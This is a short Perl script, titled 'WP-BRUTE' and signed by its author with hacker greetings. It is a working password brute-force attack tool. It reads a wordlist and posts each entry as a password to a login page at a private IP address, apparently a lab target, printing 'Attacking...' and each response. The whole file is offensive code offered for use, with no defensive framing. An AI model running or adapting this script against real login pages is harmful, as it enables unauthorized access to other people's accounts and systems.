#!/usr/bin/perl

# WP-BRUTE BY MMXM
# Gr33tz To Cy¢lone & Ut0p|4

use LWP::UserAgent;
use Data::Dumper qw(Dumper);

my $site ='http://192.168.231.134/dashboard/login.php';
$wordl = $ARGV[0];

my $a;

open($a,"<:encoding(UTF-8)",$wordl) or die "$!";

my $word;

print "\n\n\n$_:\n\nAttacking...\n\n";

while(my $data=<$a>){
	chomp($data);
	sleep(1);
my $ua = new LWP::UserAgent;
my $response = $ua->post($site, {password=>$data,submit=>'Enter'});
my $r=$response->content;
my $w;
	$w=$response->status_line;
		$r=~/(\S+)OOOOOO/;
		print "$data";
		print "$1\n";
	    print "$w";

}
exit;